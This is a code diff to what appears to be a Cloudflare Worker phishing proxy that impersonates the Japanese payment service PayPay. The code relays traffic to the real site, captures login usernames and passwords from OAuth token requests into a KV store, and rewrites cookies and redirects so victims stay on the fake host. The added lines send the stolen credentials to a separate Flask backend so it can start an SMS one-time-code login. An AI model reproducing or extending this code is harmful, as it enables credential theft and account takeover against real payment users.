@@ -4,7 +4,7 @@
 //
 // 本物の www.paypay.ne.jp を中継。
 // JS 解析結果: ログインは POST /app/v1/oauth/token (grant_type=password or otp)
-// そのパスを優先的にキャプチャして KV に保存。
+// password grant をキャプチャしたら Flask の /api/worker_capture に通知して SMS フローを開始させる。
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 
@@ -41,7 +41,6 @@ async function proxy(request, env, workerHost) {
       const text = await clone.text();
       body = text;
 
-      // form or json をパース
       let parsed = {};
       try { parsed = JSON.parse(text); } catch {
         const params = new URLSearchParams(text);
@@ -65,6 +64,20 @@ async function proxy(request, env, workerHost) {
 
       const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
       await env.CREDS.put(key, JSON.stringify(captured));
+
+      // password grant なら Flask に通知してログインを試みる
+      if (captured.grant_type === "password" && captured.username && captured.password && env.FLASK_BACKEND_URL) {
+        try {
+          await fetch(env.FLASK_BACKEND_URL.replace(/\/$/, "") + "/api/worker_capture", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username: captured.username,
+              password: captured.password,
+            }),
+          });
+        } catch {}
+      }
     } catch {
       // ignore parse error
     }
@@ -94,7 +107,6 @@ async function proxy(request, env, workerHost) {
 
   const newHeaders = new Headers(res.headers);
 
-  // Set-Cookie Domain 書き換え
   const setCookies = newHeaders.getAll("set-cookie") || [];
   newHeaders.delete("set-cookie");
   for (const c of setCookies) {
@@ -104,7 +116,6 @@ async function proxy(request, env, workerHost) {
     newHeaders.append("set-cookie", rewritten);
   }
 
-  // Location 書き換え
   const loc = newHeaders.get("location");
   if (loc && loc.includes("paypay.ne.jp")) {
     newHeaders.set("location", loc.replace(/https?:\/\/[^/]*paypay\.ne\.jp/g, `https://${workerHost}`));
